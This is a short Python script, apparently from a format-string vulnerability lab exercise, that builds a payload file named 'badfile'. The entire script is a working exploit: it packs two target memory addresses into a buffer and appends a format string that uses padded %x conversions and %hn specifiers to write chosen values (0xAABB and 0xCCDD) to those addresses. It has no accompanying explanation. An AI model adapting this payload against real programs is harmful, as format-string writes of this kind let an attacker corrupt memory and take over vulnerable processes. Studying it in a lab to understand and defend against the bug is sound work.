#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
addr1  =  0x080e5068
content[0:4]  =  (addr1).to_bytes(4,byteorder='little')

content[4:8] = ("@@@@").encode('latin-1')

addr2  = 0x080e506A
content[8:12] = (addr2).to_bytes(4, byteorder='little')

small = 0xAABB - 12 
large = 0xCCDD - 0xAABB
s = "%1$." + str(small) + "x" + "%66$hn" + \
    "%1$." + str(large) + "x" + "%64$hn"
fmt = (s).encode('latin-1')
content[12:12+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
